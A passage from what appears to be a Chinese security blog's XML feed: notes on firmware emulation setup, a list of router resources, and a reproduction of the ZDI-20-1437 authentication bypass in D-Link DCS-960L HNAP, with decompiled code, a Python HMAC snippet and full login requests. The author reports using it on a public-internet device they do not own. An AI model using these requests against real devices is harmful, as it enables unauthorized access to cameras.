        <content type="html"><![CDATA[<h2 id="更新环境原因"><a href="#更新环境原因" class="headerlink" title="更新环境原因"></a>更新环境原因</h2><p>概述 V1版本情况：</p><ul><li>采用一台 ubuntu 1804 配有基本 pwn 工具、qemu static v5.2 、完整版 binwalk 等。承担固件包中单个文件模拟调试任务，以及通过 qemu 模拟异架构系统实现少部分路由器系统模拟。</li><li>采用 attify v3.0 (base ubuntu 18.04) 的 <a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a> 模拟路由器系统</li></ul><p>V1 版本出现几个问题：</p><ul><li><p>首先是个小问题很容易解决，就是用 qemu uesr 模式单文件模拟调试，gdb-multiarch 有时会连不上。查了下资料、问了问师傅推测可能是 gdb 版本问题。</p><p>解决方法换个 ubuntu（16、20）就行了，qemu 都是每个系统的标配。</p></li><li><p>用 ubuntu 1804 qemu system 模式异架构系统，再在 qemu 虚拟机上运行固件。导入固件文件后，启动脚本基本在 <code>/etc/rc.d/init.d</code> </p><blockquote><p><a href="https://blog.csdn.net/cradmin/article/details/2270497">linux /etc/rc.d/目录的详解-cradmin</a></p><p><a href="https://blog.csdn.net/qq_29350001/article/details/51788937">linux /etc/rc.d/目录的详解-聚优致成</a></p></blockquote><p>这种方法能成功跑起来次数不多，但 qemu 使用桥接模式，让 qemu 虚拟机可与宿主机同一网段，方便调试抓包等。</p></li><li><p>当 ubuntu 1804 qemu system 模拟固件不成功，我就会尝试用 attify FAT 模拟，成功率到时挺高的，但由于 FAT 将 firmadyne 全部操作都整合起来，导致难以个性化修改。比较突出就是：</p><ul><li><p>自动生成启动脚本 <code>run.sh</code> 所配置的网络不能与宿主机在同一个网段，而是和 attify 在同一网段，导致如果想抓包，进行整系统测试时，只能在 attify 中完成。</p><blockquote><p>自动生成脚本在 attify 中新建一个网卡 192.168.0.2 ，链接到 qemu 虚拟机中，虚拟机网卡为 192.168.0.1 。attify 访问 192.168.0.1 即访问路由器后台</p></blockquote><p>尝试修改修改 run.sh 的启动模式，将网络模式修改为桥接，手动创建网桥、tap0 网卡等。异架构 debian 可以成功分配到宿主机网段 ip 出网，对于路由器固件就不行，原因未知。</p></li><li><p>firmadyne 是将固件制作成镜像模拟，也就是说 ssh 密码、 root 密码等等都是固件原有的。当模拟起来后，连不上 shell 就别想着查询端口，通过进程查询提供服务的文件 ……</p><p>这个问题解决方法就是放弃 FAT ，自己手工完成 firmadyne 模拟准备工作。解压固件后，将 <code>/etc/shadow</code> 替换一下，然后才制作镜像。问题在于说 attify 在进行解压时连不上 PostgreSQL ，使用 FAT 脚本就能连上。</p></li></ul></li><li><p>在原有 ubuntu 1804 上搭建 firmadyne ，可能安装脚本部分东西与原有环境有冲突装不上。firmadyne 的 docker 版本没有尝试过。</p></li></ul><p>V2 版本设想的几种方案：</p><ol><li>解决 firmadyne 模拟路由器固件桥接网络不成功问题，让路由器与宿主机在同一网段。</li><li>firmadyne docker 不过这个也是要解决网段问题……</li><li>在 ubuntu 1804 上搭 firmadyne ，放弃分配宿主机网段，直接在 ubuntu 里完成工作</li></ol><p>存一下参考文章</p><ul><li><p>解决出网问题</p><p><a href="https://wzt.ac.cn/2020/01/08/iot_brief/">firmadyne 简单使用指南 &amp; 模拟示例</a></p><p><a href="https://wzt.ac.cn/2019/09/10/QEMU-networking/">QEMU 网络配置一把梭</a></p></li><li><p>将 firmadyne 部署在云端</p><p><a href="https://zhuanlan.zhihu.com/p/110806057">Firmadyne的固件模拟环境搭建(超详细)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> firmadyne </tag>
            
            <tag> attify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器资源整理</title>
      <link href="archives/e244711/"/>
      <url>archives/e244711/</url>
      
        <content type="html"><![CDATA[<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>  • 国内：<a href="http://support.dlink.com.cn:9000/">http://support.dlink.com.cn:9000/</a><br>  • 台湾/香港：<a href="http://www.dlinktw.com.tw/techsupport">http://www.dlinktw.com.tw/techsupport</a><br>  • 老旧设备资源（均为US版）：<a href="https://legacy.us.dlink.com/">https://legacy.us.dlink.com/</a></p><h3 id="TPlink"><a href="#TPlink" class="headerlink" title="TPlink"></a>TPlink</h3><ul><li><p>国际站点：<a href="https://www.tp-link.com/ca/support/download">https://www.tp-link.com/ca/support/download</a></p><p>调整国家缩写切换镜像</p></li></ul><h2 id="CVE-仓库"><a href="#CVE-仓库" class="headerlink" title="CVE 仓库"></a>CVE 仓库</h2><p>  • <a href="https://github.com/PAGalaxyLab/VulInfo">https://github.com/PAGalaxyLab/VulInfo</a><br>  • <a href="https://github.com/GD008/vuln">https://github.com/GD008/vuln</a></p><h2 id="厂商安全公告"><a href="#厂商安全公告" class="headerlink" title="厂商安全公告"></a>厂商安全公告</h2><p>  • Dlink：<a href="http://forums.dlink.com/index.php?board=528.0">http://forums.dlink.com/index.php?board=528.0</a><br>      含有 patch 版本下载</p><h2 id="漏洞披露平台"><a href="#漏洞披露平台" class="headerlink" title="漏洞披露平台"></a>漏洞披露平台</h2><p>​    • <a href="https://www.cnvd.org.cn/flaw/list.htm">https://www.cnvd.org.cn/flaw/list.htm</a></p><h2 id="学习文档"><a href="#学习文档" class="headerlink" title="学习文档"></a>学习文档</h2><h3 id="总结性-WIKI"><a href="#总结性-WIKI" class="headerlink" title="总结性 WIKI"></a>总结性 WIKI</h3><p>  • 伏宸安全物联网安全百科：<a href="https://github.com/yaseng/iot-security-wiki">https://github.com/yaseng/iot-security-wiki</a><br>  • Tide安全Iot物联网安全wiki：<a href="https://www.yuque.com/tidesec/iot">https://www.yuque.com/tidesec/iot</a><br>  • 海特实验室IOTWIKI：<a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki</a><br>  • 绿盟智能设备安全分析手册：<a href="https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html">https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html</a></p><h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p><a href="https://www.anquanke.com/post/id/202965">MIPS 指令集 Shellcode 编写入门</a></p><h2 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h2><p>  • 各种架构 gdbserver ：<a href="https://github.com/rapid7/embedded-tools">https://github.com/rapid7/embedded-tools</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 资料 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZDI-20-1437 登录验证绕过复现</title>
      <link href="archives/70459c25/"/>
      <url>archives/70459c25/</url>
      
        <content type="html"><![CDATA[<h1 id="ZDI-20-1437-登录验证绕过复现"><a href="#ZDI-20-1437-登录验证绕过复现" class="headerlink" title="ZDI-20-1437 登录验证绕过复现"></a>ZDI-20-1437 登录验证绕过复现</h1><p>DCS-960L 在 NHAP 服务运行 Login 时，对 username 没有异常错误处理，导致可以通过 request 得到公钥后，计算出不存在用户名的 LoginPassword 进行登录。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li><p>漏洞固件 <a href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617">http://www.dlinktw.com.tw/techsupport/download.ashx?file=11617</a></p><p>版本号为 v1.09</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>二进制文件在 <code>./web/cgi-bin/hnap/hnap_service</code> 的 Login 函数。</p><p>http header SOAPAction 设置为：”<a href="http://purenetworks.com/HNAP1/GetModuleProfile&quot;">http://purenetworks.com/HNAP1/GetModuleProfile&quot;</a> ； Cookie 设置为 request 返回的值 ；html 里面包含标签 <code>&lt;Action&gt;login&lt;/Action&gt;</code> ，进入到下面的 login 处理流程：读取 html <code>Username</code> 和 <code>LoginPassword</code> 标签值作为用户名和密码，然后与服务器经过一系列运算后结果对比，一致则登录成功。</p><p>读取 Username 后，在路由器读取出对应的密码 db_password ，运算得出中间值 <code>key=o_pubilc_key+db_password</code> ，o_pubilc_key 是一个固定值，多次 request 返回都是一样的，o_pubilc_key 还与 challenge 相关。然后进行两轮 hmacmad5 运算得出密文与输入的 LoginPassword 比较，判断是否登录成功。hmac 加密用的秘钥：Challenge、PubilcKey 都是可以在 request 获取。</p><p><code>hmac_md5(challenge, len_challenge, key, len_key, &amp;v47);</code>、<code>hmac_md5(challenge, len_challenge, private_key, len_private_key, &amp;v47);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">v15 = (<span class="keyword">const</span> <span class="keyword">char</span> *)ixmlGetElementValueByTag(v4, <span class="string">&quot;Username&quot;</span>);<span class="comment">// 通过tag获取用户名密码</span></span><br><span class="line">    v16 = (<span class="keyword">const</span> <span class="keyword">char</span> *)ixmlGetElementValueByTag(v4, <span class="string">&quot;LoginPassword&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)v36, v15);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)v36, <span class="string">&quot;Admin&quot;</span>) )</span><br><span class="line">        <span class="built_in">snprintf</span>((<span class="keyword">char</span> *)v36, <span class="number">0x20</span>u, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;admin&quot;</span>);<span class="comment">// Admin替换为admin</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">      <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)v38, v16);</span><br><span class="line">    challenge = (<span class="keyword">const</span> <span class="keyword">char</span> *)v36;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;username: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)v36);</span><br><span class="line">    loginpassword = (<span class="keyword">const</span> <span class="keyword">char</span> *)v38;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;loginPassword: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)v38);</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">    key[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    v56 = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    currect_password[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    v52 = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    db_password[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">    v54 = <span class="number">0</span>;</span><br><span class="line">    v47 = <span class="number">0</span>;</span><br><span class="line">    v48 = <span class="number">0</span>;</span><br><span class="line">    v49 = <span class="number">0</span>;</span><br><span class="line">    v50 = <span class="number">0</span>;</span><br><span class="line">    usrInit(<span class="number">0</span>);</span><br><span class="line">    usrGetPass(challenge, db_password, <span class="number">0x21</span>);<span class="comment">// 数据库查询用户名对应密码db_password</span></span><br><span class="line">    usrFree();</span><br><span class="line">    public_key = (<span class="keyword">const</span> <span class="keyword">char</span> *)o_public_key;</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)key, <span class="string">&quot;%s%s&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)o_public_key, (<span class="keyword">const</span> <span class="keyword">char</span> *)db_password);<span class="comment">// key=o_pubilc_key+db_password</span></span><br><span class="line">    challenge = (<span class="keyword">char</span> *)&amp;o_public_key[<span class="number">4</span>] + <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My challenge: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;o_public_key[<span class="number">4</span>] + <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My public_key: %s\n&quot;</span>, public_key);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My password: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)db_password);</span><br><span class="line">    len_challenge = <span class="built_in">strlen</span>(challenge);</span><br><span class="line">    len_key = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)key);</span><br><span class="line">    hmac_md5(challenge, len_challenge, key, len_key, &amp;v47);</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)private_key, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v47, v48, v49, v50);<span class="comment">// 写入private_key</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My private_key: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)private_key);</span><br><span class="line">    v47 = <span class="number">0</span>;</span><br><span class="line">    v48 = <span class="number">0</span>;</span><br><span class="line">    v49 = <span class="number">0</span>;</span><br><span class="line">    v50 = <span class="number">0</span>;</span><br><span class="line">    public_key = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">strlen</span>(challenge);</span><br><span class="line">    len_private_key = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)private_key);</span><br><span class="line">    hmac_md5(challenge, public_key, private_key, len_private_key, &amp;v47);<span class="comment">// hmac_md5(challenge, len_challenge, private_key, len_private_key, &amp;v47);</span></span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)currect_password, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, v47, v48, v49, v50);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My login_password: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)currect_password);</span><br><span class="line">    v20 = <span class="built_in">strcmp</span>(loginpassword, (<span class="keyword">const</span> <span class="keyword">char</span> *)currect_password) == <span class="number">0</span>;<span class="comment">// </span></span><br><span class="line">                                            <span class="comment">// loginpassword-&gt;输入的密码</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Check authStatus: %d\n&quot;</span>, v20);<span class="comment">// 验证成功返回值1</span></span><br><span class="line">    v21 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v20 )</span><br></pre></td></tr></table></figure><p>也就是如果知道用户名对应密码，先 request 获取秘钥和Cookie ，本地运算加密后的密码就能登录成功。由用户名获取的密码的函数 <code>usrGetPass</code> 在二进制文件：<code>usr/lib/libweb.so.0</code> 。</p><p>逻辑是将输入的 username 与 username_list 逐一 strcmp ，这个循环最多<strong>22次</strong>。<strong>如果用户名不存在就会返回 -1 ，这是存储正确密码的局部变量 a2 为全 0</strong> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">usrGetPass</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *username, <span class="keyword">char</span> *a2, <span class="keyword">size_t</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// $s3</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v7; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *each_name; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [sp+18h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*username )                             <span class="comment">// username为空退出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;username_list;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    each_name = *v7;</span><br><span class="line">    v7 += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( each_name )</span><br><span class="line">    &#123;</span><br><span class="line">      n = a3;</span><br><span class="line">      v9 = <span class="built_in">strcmp</span>(each_name, username);</span><br><span class="line">      a3 = n;</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )                                <span class="comment">// 匹配打断循环</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v6;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">21</span> )                             <span class="comment">// 循环22次没有找到就退出</span></span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(a2, *((<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;password_list + <span class="number">3</span> * v6 + <span class="number">2</span>), n);<span class="comment">// strncpy(db_password,[password],0x21)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当返回值为 -1 时，login 并没有对应的异常错误处理，而是用空密码进行运算。</p><p>在用 qemu 尝试仿真，设置一系列变量后依然会卡在 main 函数调用 fwrite 将数据写入局部变量，进入 fwrite 后第一个参数（写入地址指针）会丢失变成 0 ，导致报错：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210218223152.png" alt="image-20210218223146692"></p><p>找一个公网上的 DCS-960L 测试一下，模仿正常登录过程：先发送一个 POST 包 request 公钥信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HNAP1 HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">SOAPAction: &quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;Login&quot;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 378</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns&#x3D;&quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;&quot;&gt;&lt;Action&gt;request&lt;&#x2F;Action&gt;&lt;Username&gt;&lt;&#x2F;Username&gt;&lt;LoginPassword&gt;&lt;&#x2F;LoginPassword&gt;&lt;&#x2F;Login&gt;&lt;&#x2F;soap:Body&gt;&lt;&#x2F;soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210218225310.png" alt="image-20210218225310367"></p><p>然后在本地用空秘钥运算出 LoginPassword ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line">enc1 = hmac.new(public_key, challenge).hexdigest()</span><br><span class="line">enc2 = hmac.new(enc1.upper(), challenge).hexdigest()</span><br><span class="line">print(<span class="string">&quot;password: &quot;</span> + enc2)</span><br></pre></td></tr></table></figure><p>补充上 cookie 和 loginpassword 标签，action 改为 login 登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HNAP1 HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uid&#x3D;5Ae8c695b1;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">SOAPAction: &quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;GetModuleProfile&quot;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 410</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:soap&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns&#x3D;&quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;&quot;&gt;&lt;Action&gt;login&lt;&#x2F;Action&gt;&lt;Username&gt;SKYE&lt;&#x2F;Username&gt;&lt;LoginPassword&gt;C6F5148B44048218D1E8E2282C8F6EBB&lt;&#x2F;LoginPassword&gt;&lt;&#x2F;Login&gt;&lt;&#x2F;soap:Body&gt;&lt;&#x2F;soap:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210218233358.png" alt="image-20210218233358347"></p><p>登录成功后，想试下 nhap 其他功能，比如设置路由器密码之类的，没整出来不知道是 xml 构造错了还是什么，一直返回 Login request 的数据。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/hacking-d-link-routers-with-hnap/">http://www.atomsec.org/%E5%AE%89%E5%85%A8/hacking-d-link-routers-with-hnap/</a></p><p><a href="https://wzt.ac.cn/2021/01/17/DCS-960L/">https://wzt.ac.cn/2021/01/17/DCS-960L/</a></p><p><a href="https://www.4hou.com/posts/1QL0">https://www.4hou.com/posts/1QL0</a></p><p><a href="https://xz.aliyun.com/t/2834#toc-3">https://xz.aliyun.com/t/2834#toc-3</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZDI-20-1437 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZDI-CAN-11360 格式化字符串漏洞复现</title>
      <link href="archives/af28835/"/>
      <url>archives/af28835/</url>
      
